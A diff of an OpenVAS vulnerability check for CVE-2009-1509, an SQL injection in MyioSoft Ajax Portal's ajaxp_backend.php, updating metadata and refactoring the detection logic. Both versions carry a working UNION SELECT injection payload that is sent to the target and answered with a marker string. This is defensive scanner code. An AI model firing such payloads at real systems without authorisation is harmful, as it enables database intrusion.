@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: MyioSoft_ajax_portal_34338.nasl 5002 2017-01-13 10:17:13Z teissa $
+# $Id: MyioSoft_ajax_portal_34338.nasl 5767 2017-03-29 13:32:35Z cfi $
 #
 # MyioSoft Ajax Portal 'ajaxp_backend.php' SQL Injection Vulnerability
 #
@@ -34,23 +34,19 @@ tag_summary = "MyioSoft Ajax Portal is prone to an SQL-injection vulnerability
 
   Ajax Portal 3.0 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100095);
- script_version("$Revision: 5002 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-13 11:17:13 +0100 (Fri, 13 Jan 2017) $");
+ script_version("$Revision: 5767 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:32:35 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-04-02 12:09:33 +0200 (Thu, 02 Apr 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1509");
  script_bugtraq_id(34338);
-
  script_name("MyioSoft Ajax Portal 'ajaxp_backend.php' SQL Injection Vulnerability");
-
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -65,22 +61,18 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dir = make_list("/portal",cgi_dirs());
-foreach d (dir)
-{ 
- url = string(d, "/ajaxp_backend.php?page=-1+union+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7--");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
- if( buf == NULL )continue;
+foreach dir( make_list_unique( "/portal", cgi_dirs( port:port ) ) ) { 
 
- if( egrep(pattern:"OpenVAS-SQL-Injection-Test", string: buf) )
-   {    
-     security_message(port:port);
-     exit(0);
-   } 
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/ajaxp_backend.php?page=-1+union+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7--");
+
+  if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
-exit(0);
+
+exit( 99 );
